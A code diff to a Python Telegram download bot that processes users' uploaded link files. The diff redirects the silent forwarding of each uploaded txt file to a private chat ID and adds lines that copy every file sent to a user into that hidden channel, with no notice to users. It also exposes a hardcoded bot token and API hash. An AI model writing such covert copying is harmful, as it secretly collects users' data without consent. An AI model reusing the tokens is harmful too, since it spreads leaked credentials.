@@ -15,6 +15,7 @@ from p_bar import progress_bar
 from subprocess import getstatusoutput
 from config import *
 import helper
+from logger import logging
 import logging
 import time
 import aiohttp
@@ -30,7 +31,7 @@ import os
 
 bot = Client(
     "bot",
-    bot_token= "5924735820:AAGDPiM3DuYmkXEGUNpsoWQxPd3qrcep4Qg",
+    bot_token= "6213344139:AAHn-mglMQrCcMBbIxxfP6TXITD3BJU_p84",
     api_id= 29410389,
     api_hash= "0c716764715886f6641477ffbb63e1ee")
 
@@ -56,7 +57,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text("Send txt file**")
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1001936874635, x)
+    await bot.send_document(-1001840293770, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
@@ -322,7 +323,8 @@ async def account_login(bot: Client, m: Message):
                         reply = await m.reply_text(f"Uploading - `{name}`")
                         time.sleep(1)
                         start_time = time.time()
-                        await m.reply_document(ka,caption=cc1)
+                        copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
+                        await copy.copy(chat_id = -1001840293770)
                         count+=1
                         await reply.delete (True)
                         time.sleep(1)
@@ -340,7 +342,8 @@ async def account_login(bot: Client, m: Message):
                         reply = await m.reply_text(f"Uploading - ```{name}```")
                         time.sleep(1)
                         start_time = time.time()
-                        await m.reply_document(ka, caption=f'**File No. »** {str(count).zfill(3)}\n**File Name »** {name1} {res}.pdf\n**Batch »** {raw_text0}\n\n**{CR}**')
+                        copy = await bot.send_document(chat_id=m.chat.id,document=f'{name}.pdf', caption=cc1)
+                        await copy.copy(chat_id = -1001840293770)
                         count+=1
                         # time.sleep(1)
                         await reply.delete (True)
